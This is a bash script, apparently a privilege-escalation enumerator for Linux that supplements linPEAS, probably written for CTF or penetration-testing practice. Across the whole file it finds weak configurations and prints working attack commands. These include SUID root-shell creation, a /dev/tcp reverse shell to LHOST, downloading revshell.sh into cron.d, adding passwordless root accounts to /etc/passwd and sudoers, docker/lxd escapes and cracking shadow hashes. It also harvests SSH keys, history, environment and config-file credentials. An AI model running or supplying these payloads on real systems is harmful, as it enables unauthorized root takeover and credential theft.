#!/bin/bash
# =============================================================================
# linux-korek.sh - linPEAS Gap Filler with Exploit Hints
# Author: korek
# =============================================================================
# Usage:
#   ./linux-korek.sh          # quick mode (~30 sec)
#   ./linux-korek.sh --full   # full mode (~2 min)
# =============================================================================

FULL=0
[ "$1" = "--full" ] && FULL=1

R='\033[0;31m'; G='\033[0;32m'; Y='\033[0;33m'
C='\033[0;36m'; W='\033[1;37m'; N='\033[0m'

hit()    { echo -e "${G}[+]${N} $1"; }
info()   { echo -e "    ${W}>>>${N} $1"; }
sec()    { echo -e "\n${C}[*] ===== $1 =====${N}"; }
warn()   { echo -e "${Y}[!]${N} $1"; }
hot()    { echo -e "${R}[!!]${N} $1"; }
exploit(){ echo -e "    ${Y}[EXPLOIT]${N} $1"; }
gtfo()   { echo -e "    ${Y}[GTFOBins]${N} https://gtfobins.github.io/gtfobins/$1/"; }

echo -e "${C}================================================${N}"
echo -e "${C}  linux-korek.sh - linPEAS Gap Filler${N}"
[ $FULL -eq 0 ] && echo -e "${Y}  QUICK MODE - run --full for complete scan${N}"
[ $FULL -eq 1 ] && echo -e "${G}  FULL MODE${N}"
echo -e "${C}================================================${N}"

# ===========================================================
# QUICK MODE
# ===========================================================

# 1. Root-owned writable files
sec "ROOT-OWNED WRITABLE FILES"
found=0
find / -user root -writable -type f 2>/dev/null | \
grep -vE "(/proc|/sys|/dev|/tmp|/var/tmp|/run)" | \
while read f; do
    hot "Root-owned writable: $f"
    exploit "echo '#!/bin/bash' > $f"
    exploit "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> $f"
    exploit "wait for execution, then: /tmp/rootbash -p"
    found=1
done
[ $found -eq 0 ] 2>/dev/null && info "None found"

# 2. Writable PATH directories
sec "WRITABLE PATH DIRECTORIES"
echo $PATH | tr ':' '\n' | while read dir; do
    if [ -w "$dir" ] 2>/dev/null; then
        hot "Writable PATH dir: $dir"
        exploit "Create malicious binary with same name as root-executed command"
        exploit "echo '#!/bin/bash\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1' > $dir/<cmd>"
        exploit "chmod +x $dir/<cmd> && wait for root to execute"
    fi
    find "$dir" -writable -type f 2>/dev/null | while read f; do
        hot "Writable binary in PATH: $f"
        exploit "cp /bin/bash $f (if SUID) OR replace with reverse shell"
    done
done

# 3. Custom SUID not in package manager
sec "CUSTOM SUID BINARIES"

# Known system SUID binaries — not exploitable, skip these
SYSTEM_SUIDS="su sudo fusermount fusermount3 mount umount newgrp passwd chfn chsh
gpasswd pkexec pt_chown ssh-keysign at crontab ping ping6 traceroute6
write wall unix_chkpwd pam_timestamp_check Xorg exim4 postdrop postqueue
sendmail newuidmap newgidmap dbus-daemon-launch-helper polkit-agent-helper-1"

# Verified GTFOBins SUID entries (has actual SUID section on gtfobins.github.io)
GTFO_SUID="aa-exec ab apt apt-get aria2c arj awk base32 base64 bash bc bpftrace
busybox bzip2 c89 c99 capsh cat chmod chown chroot cmp cp cpio cpulimit
csh curl cut dash date dd diff dig docker ed emacs env expect file find
fish flock fmt fold gawk gdb gem git grep gzip hd head hexdump iconv ip
jjs join ksh ld.so less look lua make mawk more msgattrib msgcat msgconv
msgfilter msgmerge msguniq mv mysql nasm nawk nc netcat nice nl nmap node
nohup od openssl perl pg php pip pip3 python python3 readelf rev rsync
ruby run-parts scp sed setarch sftp shuf sort sqlite3 ssh stdbuf strace
strings tac tail tar taskset tclsh tee tftp timeout troff ul unexpand
uniq unzip uudecode uuencode vim watch wget xargs xxd xz yash zip zsh"

find / -perm -4000 -type f 2>/dev/null | while read f; do
    bname=$(basename "$f")

    # skip known non-exploitable system SUID binaries
    echo "$SYSTEM_SUIDS" | grep -qw "$bname" && continue

    # skip if in package manager (standard system binary)
    if command -v dpkg >/dev/null 2>&1; then
        dpkg -S "$f" >/dev/null 2>&1 && continue
    elif command -v rpm >/dev/null 2>&1; then
        rpm -qf "$f" >/dev/null 2>&1 && continue
    fi

    hot "Custom SUID: $f"
    ls -la "$f" 2>/dev/null | while read line; do info "$line"; done

    # only show GTFOBins if binary actually has a SUID entry
    if echo "$GTFO_SUID" | grep -qw "$bname"; then
        gtfo "$bname/#suid"
        # specific exploit hints per binary
        case "$bname" in
            bash|sh|dash|zsh|fish|ksh|csh)
                exploit "$f -p" ;;
            python*|python)
                exploit "$f -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'" ;;
            perl)
                exploit "$f -e 'exec \"/bin/sh\"'" ;;
            ruby)
                exploit "$f -e 'exec \"/bin/sh -p\"'" ;;
            find)
                exploit "$f . -exec /bin/sh -p \\; -quit" ;;
            vim|vi|rvim|rview)
                exploit "$f -c ':!/bin/sh -p'" ;;
            nmap)
                exploit "echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse && $f --script /tmp/x.nse" ;;
            less|more)
                exploit "$f /etc/passwd  then type: !/bin/sh" ;;
            nano)
                exploit "$f /etc/passwd  then Ctrl+R Ctrl+X  then: reset; sh 1>&0 2>&0" ;;
            awk|gawk|mawk|nawk)
                exploit "$f 'BEGIN {system(\"/bin/sh -p\")}'" ;;
            env)
                exploit "$f /bin/sh -p" ;;
            dd)
                exploit "echo '#!/bin/sh\n/bin/sh' > /tmp/x && $f if=/tmp/x of=/bin/sh" ;;
            cp)
                exploit "cp /bin/bash /tmp/ && chmod +s /tmp/bash && /tmp/bash -p" ;;
            chmod)
                exploit "$f +s /bin/bash && /bin/bash -p" ;;
            chown)
                exploit "$f \$(id -un):\$(id -gn) /etc/shadow" ;;
            tee)
                exploit "echo 'root2::0:0::/root:/bin/bash' | $f -a /etc/passwd && su root2" ;;
            wget)
                exploit "$f -O /etc/cron.d/x http://LHOST/revshell.sh" ;;
            curl)
                exploit "$f http://LHOST/revshell.sh -o /etc/cron.d/x" ;;
            tar)
                exploit "$f -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" ;;
            node)
                exploit "$f -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'" ;;
            php*)
                exploit "$f -r 'pcntl_exec(\"/bin/sh\",[\"-p\"]);'" ;;
            *)
                exploit "Check GTFOBins SUID section at link above" ;;
        esac
    else
        # not in GTFOBins - still show but no false link
        warn "Not in GTFOBins SUID list - may still be exploitable"
        exploit "Run: strings $f | grep -iE 'exec|system|sh|bash'"
        exploit "Check if binary calls other programs - PATH hijack may work"
    fi

    # writable check
    if [ -w "$f" ]; then
        hot "AND WRITABLE - instant root!"
        exploit "cp /bin/bash $f && $f -p"
    fi
done

# 4. Dangerous capabilities
sec "DANGEROUS CAPABILITIES"
getcap -r / 2>/dev/null | \
grep -E "(cap_setuid|cap_dac_override|cap_sys_admin|cap_chown|cap_fowner)" | \
while read line; do
    f=$(echo "$line" | awk '{print $1}')
    bname=$(basename "$f")
    hot "Dangerous capability: $line"
    gtfo "$bname"
    case "$bname" in
        python*) exploit "$f -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" ;;
        perl)    exploit "$f -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'" ;;
        ruby)    exploit "$f -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'" ;;
        vim*)    exploit "$f -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-c\",\"reset; exec sh\")'" ;;
        node)    exploit "$f -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",[],{stdio:[0,1,2]})'" ;;
        tar)     exploit "$f -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" ;;
        *)       exploit "Check GTFOBins for $bname with cap_setuid" ;;
    esac
done

# 5. Docker/LXD group
sec "DOCKER / LXD GROUP"
if id | grep -q docker; then
    hot "In docker group!"
    exploit "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    exploit "docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh"
fi
if id | grep -q lxd; then
    hot "In lxd group!"
    exploit "lxc init ubuntu:18.04 test -c security.privileged=true"
    exploit "lxc config device add test whatever disk source=/ path=/mnt/root recursive=true"
    exploit "lxc start test && lxc exec test -- /bin/sh"
    exploit "Full guide: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html"
fi
if [ -w /var/run/docker.sock ] 2>/dev/null; then
    hot "Docker socket writable!"
    exploit "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
fi

# 6. Writable sensitive system files
sec "WRITABLE SYSTEM FILES"
for f in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/ssh/sshd_config; do
    [ -w "$f" ] 2>/dev/null || continue
    hot "WRITABLE: $f"
    case "$f" in
        /etc/passwd)
            exploit "Add root user: echo 'korek::0:0::/root:/bin/bash' >> /etc/passwd"
            exploit "Then: su korek (no password needed)"
            ;;
        /etc/shadow)
            exploit "Replace root hash with known password hash"
            exploit "openssl passwd -1 -salt xyz password123 → copy hash to root entry"
            ;;
        /etc/sudoers)
            exploit "echo '\$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
            exploit "Then: sudo su"
            ;;
        /etc/crontab)
            exploit "echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /etc/crontab"
            exploit "Wait 1 min then: /tmp/rootbash -p"
            ;;
        /etc/ssh/sshd_config)
            exploit "Add: PermitRootLogin yes, PasswordAuthentication yes"
            exploit "Restart sshd, set root password, SSH in as root"
            ;;
    esac
done

# 7. Sudo version CVE check (no password needed)
sec "SUDO CVE CHECK"
sudo_ver=$(sudo -V 2>/dev/null | grep "Sudo version" | awk '{print $3}')
[ -n "$sudo_ver" ] && info "Sudo version: $sudo_ver"
echo "$sudo_ver" | grep -qE "^1\.[0-8]\.|^1\.9\.(0|1|2|3|4|5|6|7|8|9|10|11|12p1)" && \
    hot "Sudo $sudo_ver vulnerable to CVE-2023-22809 (sudoedit bypass)!" && \
    exploit "SUDO_EDITOR='vim -- /etc/sudoers' sudoedit /etc/hosts"
info "Check sudo perms manually if you have password: sudo -l"

# 8. Shell history cred grep
sec "SHELL HISTORY CREDENTIALS"
for histfile in ~/.bash_history ~/.zsh_history /home/*/.bash_history /root/.bash_history; do
    [ -f "$histfile" ] 2>/dev/null || continue
    hits=$(grep -iE "(pass|secret|key|mysql.*-p|psql.*-U|sshpass)" \
           "$histfile" 2>/dev/null | grep -v "^#")
    [ -n "$hits" ] && hit "$histfile:" && echo "$hits" | head -10 | while read l; do info "$l"; done
done

# 9. Shadow backups
sec "SHADOW / PASSWD BACKUPS"
# /etc/shadow - contains password hashes
if [ -r /etc/shadow ] 2>/dev/null; then
    hot "READABLE /etc/shadow!"
    hashes=$(cat /etc/shadow 2>/dev/null | grep -v "^[^:]*:[!*]" | grep -v "^[^:]*::") 
    if [ -n "$hashes" ]; then
        echo "$hashes" | head -10 | while read l; do info "$l"; done
        exploit "Save hashes and crack on Kali:"
        exploit "hashcat -m 1800 shadow.txt rockyou.txt  (sha512crypt \$6\$)"
        exploit "hashcat -m 500  shadow.txt rockyou.txt  (md5crypt \$1\$)"
        exploit "hashcat -m 3200 shadow.txt rockyou.txt  (bcrypt \$2y\$)"
    fi
fi

# shadow backup - contains hashes like /etc/shadow
for f in /etc/shadow- /etc/shadow.bak /var/shadow; do
    if [ -r "$f" ] 2>/dev/null && [ -s "$f" ]; then
        hot "Readable shadow backup: $f"
        exploit "Copy to Kali and crack: hashcat -m 1800 $f rockyou.txt"
    fi
done

# /etc/passwd- is a backup of /etc/passwd (NO hashes - just user info)
if [ -r /etc/passwd- ] 2>/dev/null; then
    hit "Readable /etc/passwd- backup (user list, no hashes)"
    diff /etc/passwd /etc/passwd- 2>/dev/null | head -5 | while read l; do info "$l"; done
fi

# 10. Writable cron binaries
sec "CRON WRITABLE BINARIES"
for f in /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/*; do
    [ -f "$f" ] 2>/dev/null || continue
    cat "$f" 2>/dev/null | grep -v "^#\|^$" | while read line; do
        for word in $line; do
            if [ -f "$word" ] && [ -w "$word" ]; then
                hot "Writable cron binary: $word"
                exploit "echo '#!/bin/bash' > $word"
                exploit "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> $word"
                exploit "chmod +x $word && wait for cron execution"
                exploit "Then: /tmp/rootbash -p"
            fi
        done
    done
done

# 11. NFS no_root_squash
sec "NFS NO_ROOT_SQUASH"
[ -r /etc/exports ] 2>/dev/null && \
grep "no_root_squash" /etc/exports 2>/dev/null | while read l; do
    hot "NFS no_root_squash: $l"
    share=$(echo "$l" | awk '{print $1}')
    exploit "On Kali: mkdir /tmp/nfs && mount -t nfs TARGET:$share /tmp/nfs"
    exploit "cp /bin/bash /tmp/nfs/ && chmod +s /tmp/nfs/bash"
    exploit "On target: $share/bash -p"
done

# 12. Interesting files
sec "INTERESTING FILES"
find /home /root /opt /var/www -maxdepth 4 \( \
    -name "flag*" -o -name "proof*" -o -name "local*" -o \
    -name "pass*.txt" -o -name "cred*.txt" -o -name "*.kdbx" -o \
    -name ".netrc" -o -name "note*.txt" \
\) -readable 2>/dev/null | while read f; do
    hit "Interesting: $f"
    [ -f "$f" ] && file "$f" 2>/dev/null | grep -q "text" && \
        cat "$f" 2>/dev/null | head -5 | while read l; do info "$l"; done
done

# ===========================================================
# FULL MODE ONLY
# ===========================================================
if [ $FULL -eq 1 ]; then

# 13. Process monitoring
sec "PROCESS MONITORING - 60 seconds"
warn "Watching for new root processes..."
warn "When you see a root process - check if its binary/script is writable"
warn "If writable: replace with reverse shell, wait for re-execution = root"
declare -A seen
while IFS= read -r line; do seen["$line"]=1; done < \
    <(ps -eo pid,user,cmd --no-headers 2>/dev/null)
end=$((SECONDS+60))
while [ $SECONDS -lt $end ]; do
    while IFS= read -r line; do
        [ "${seen[$line]+_}" ] && continue
        user=$(echo "$line" | awk '{print $2}')
        cmd=$(echo "$line" | cut -d' ' -f3-)
        pid=$(echo "$line" | awk '{print $1}')
        binary=$(echo "$cmd" | awk '{print $1}')
        if [ "$user" = "root" ] || [ "$user" = "0" ]; then
            hot "ROOT PROCESS [PID:$pid]: $cmd"
            # check if binary is writable
            if [ -f "$binary" ] && [ -w "$binary" ]; then
                hot "BINARY IS WRITABLE: $binary"
                exploit "echo '#!/bin/bash' > $binary"
                exploit "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> $binary"
                exploit "chmod +x $binary && wait for re-execution"
                exploit "Then: /tmp/rootbash -p"
            else
                info "Binary not writable - check if it calls other scripts"
                info "ls -la $binary"
                info "strings $binary | grep -iE 'sh|exec|system|script'"
            fi
        fi
        seen["$line"]=1
    done < <(ps -eo pid,user,cmd --no-headers 2>/dev/null)
    sleep 0.5
done

# 14. Systemd writable services
sec "WRITABLE SYSTEMD SERVICES"
find /etc/systemd /lib/systemd -name "*.service" -writable 2>/dev/null | \
while read f; do
    hot "Writable service: $f"
    grep "^Exec" "$f" 2>/dev/null | while read l; do info "$l"; done
    exploit "Edit ExecStart=/tmp/rootbash in $f"
    exploit "systemctl daemon-reload && systemctl restart <service>"
done

# 15. Archives & DB dumps
sec "ARCHIVES & DB DUMPS"
find / -maxdepth 8 \( \
    -name "*.zip" -o -name "*.tar.gz" -o -name "*.tgz" -o \
    -name "*.sql" -o -name "*.sqlite" -o -name "*.db" \
\) -readable -type f 2>/dev/null | \
grep -vE "(/usr/share|/usr/lib|/snap|linux-korek)" | \
while read f; do
    size=$(du -sh "$f" 2>/dev/null | cut -f1)
    hot "Unusual file: $f ($size)"
    case "$f" in
        *.zip) exploit "unzip -l $f | grep -iE 'pass|config|sql|key'" ;;
        *.sql) exploit "grep -iE 'INSERT.*pass|CREATE USER' $f | head -20" ;;
        *.sqlite|*.db) exploit "sqlite3 $f .tables && sqlite3 $f 'SELECT * FROM users;'" ;;
    esac
done

# 16. Non-standard directories
sec "FILES IN NON-STANDARD DIRS"
for d in /opt /srv /backup /data /var/backup; do
    [ -d "$d" ] || continue
    find "$d" -readable -type f 2>/dev/null | grep -v "linux-korek" | \
        while read f; do
            size=$(du -sh "$f" 2>/dev/null | cut -f1)
            hit "$f ($size)"
        done
done

# 17. CMS configs
sec "CMS CONFIG FILES"
for f in /var/www/html/configuration.php /var/www/html/wp-config.php \
         /var/www/*/configuration.php /var/www/*/wp-config.php; do
    [ -f "$f" ] 2>/dev/null || continue
    hot "CMS config: $f"
    grep -iE "(\\\$pass|password|DB_PASS|secret)" "$f" 2>/dev/null | \
        grep -v "^//" | head -5 | while read l; do
            info "$l"
            exploit "Use these creds to login to DB: mysql -u USER -p'PASS' DB"
        done
done

# 18. App configs
sec "APP CONFIGS WITH CREDENTIALS"
find /var/www /srv /opt /home -maxdepth 6 \( \
    -name "conn.php" -o -name "config.php" -o -name ".env" -o \
    -name "database.yml" -o -name "settings.py" \
\) -readable 2>/dev/null | while read f; do
    hits=$(grep -iE "(password|secret|api_key)" "$f" 2>/dev/null | grep -v "^#\|^//" | head -3)
    [ -n "$hits" ] && hot "Creds in: $f" && echo "$hits" | while read l; do info "$l"; done
done

# 19. SSH private keys
sec "SSH PRIVATE KEYS"
find / -maxdepth 8 \( -name "id_rsa" -o -name "id_dsa" -o \
    -name "id_ed25519" -o -name "*.pem" \) -readable -type f 2>/dev/null | \
grep -vE "(/usr/share|/usr/lib|linux-korek)" | while read f; do
    head -1 "$f" 2>/dev/null | grep -q "PRIVATE" || continue
    hot "SSH Key: $f"
    exploit "chmod 600 $f && ssh -i $f root@TARGET"
    exploit "ssh -i $f USER@TARGET"
done

# 20. Environment variables
sec "ENVIRONMENT VARIABLES WITH CREDENTIALS"
env 2>/dev/null | grep -iE "(pass|secret|key|token|api|aws)" | \
    while read l; do
        hot "Env cred: $l"
        exploit "Use credential found in environment variable"
    done

# 21. Tmux/Screen
sec "TMUX / SCREEN SESSIONS"
tmux list-sessions 2>/dev/null | while read l; do
    hit "tmux: $l"
    exploit "tmux attach -t <session_name>"
done
find /tmp -name "tmux-*" -type d 2>/dev/null | while read d; do
    stat_info=$(stat -c '%U %a' "$d" 2>/dev/null)
    hit "tmux socket dir: $d ($stat_info)"
    exploit "tmux -S $d/default attach"
done

# 22. User enumeration for spray
sec "LOCAL USERS (password spray targets)"
awk -F: '$3>=1000||$3==0{print $1" uid:"$3" shell:"$7}' /etc/passwd | \
    while read l; do info "$l"; done
exploit "Try known passwords: su <user> or ssh <user>@localhost"

fi  # end FULL mode

echo -e "\n${G}[+] Done!${N}"
echo -e "    ${R}[!!]${N} = Critical finding with exploit"
echo -e "    ${Y}[!]${N}  = Warning"
echo -e "    ${G}[+]${N}  = Information"
echo -e "    ${Y}[EXPLOIT]${N} = How to exploit"
echo -e "    ${Y}[GTFOBins]${N} = GTFOBins reference"
[ $FULL -eq 0 ] && \
    echo -e "\n${Y}Tip: Run './linux-korek.sh --full' for complete scan + process monitoring${N}"
